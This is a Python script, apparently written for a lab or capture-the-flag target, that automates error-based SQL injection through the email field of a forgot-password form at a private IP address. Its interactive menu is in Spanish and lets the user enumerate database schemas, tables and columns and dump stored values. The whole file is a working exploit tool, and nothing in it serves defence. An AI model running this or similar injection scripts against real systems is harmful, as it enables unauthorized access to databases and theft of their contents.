import requests
from bs4 import BeautifulSoup
import re


def enumerate(payload_parcial,entrada):
	resultado = ""
	for i in range(0,10):
		j = str(i)
		data = {"email":f"test@gmail.com' AND 1337=CAST('~'||({payload_parcial}" +f"{j})||'~' AS NUMERIC)--test@gmail.com"}
		respuesta = requests.post("http://10.129.204.249:8080/forgot",data=data)
		soup = BeautifulSoup(respuesta.text,'html.parser')
		etiqueta = soup.find('pre',style="overflow-x:auto; overflow-wrap:anywhere; white-space:pre-wrap;")
		if etiqueta != None:
			coincidencia1 = re.search(r"\"~.+~\"",etiqueta.text)
			if coincidencia1 != None:
				resultado += (coincidencia1.group(0).replace('~','')).replace('"',' ')
		else:
			break
	if entrada == 'S':
			print(f"Los schemas son: {resultado}\n")
	if entrada == 'T':
			print(f"Las tablas son: {resultado}\n")
	if entrada == 'C':
			print(f"Las columnas son: {resultado}\n")
	if entrada == 'D':
			print(f"Los valores de las columnas son: {resultado}\n")
while(True):
	entrada = input("Si desea enumerar los schemas de la base de datos utilazada por la aplicacion, digite 'S'.\n\rSi desea enumerar las tablas de un schema especifico, digite 'T'.\n\rSi desea enumerar las columnas de una tabla, digite 'C'.\r\nSi desea conocer los valores almacenados en una o varias columnas, digite 'D'.\n\rDigite su entrada: ")
	if entrada == 'S':
		variable_A = "SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET "
		enumerate(variable_A,entrada)
	if entrada == 'T':
		schema_name = input("Digite el nombre del schema donde esta la tabla: ")
		variable_B = f"SELECT table_name FROM information_schema.tables where table_schema = '{schema_name}' LIMIT 1 OFFSET "
		enumerate(variable_B,entrada)
	if entrada == 'C':
		entradas = input("Digite el nombre de la tabla y del schema donde esta la tabla. Ademas, digitelos separados por coma y en el orden en que fueron digitados: ")
		entradas_1 = entradas.split(',')
		variable_C = f"SELECT column_name FROM information_schema.columns where table_schema = '{entradas_1[1]}' AND table_name= '{entradas_1[0]}' LIMIT 1 OFFSET "
		enumerate(variable_C,entrada)
	if entrada == 'D':
		entradas = input("Digite el nombre de la tabla seguido de las columnas. Ademas, digitelos separados por coma y en el orden indicado: ")
		entradas_2 = entradas.split(',')
		table_name = entradas_2[0]
		del entradas_2[0]
		entradas_3 = ",',',".join(entradas_2)
		variable_D = f"SELECT CONCAT({entradas_3}) FROM {table_name} LIMIT 1 OFFSET "
		print(variable_D)
		enumerate(variable_D,entrada)
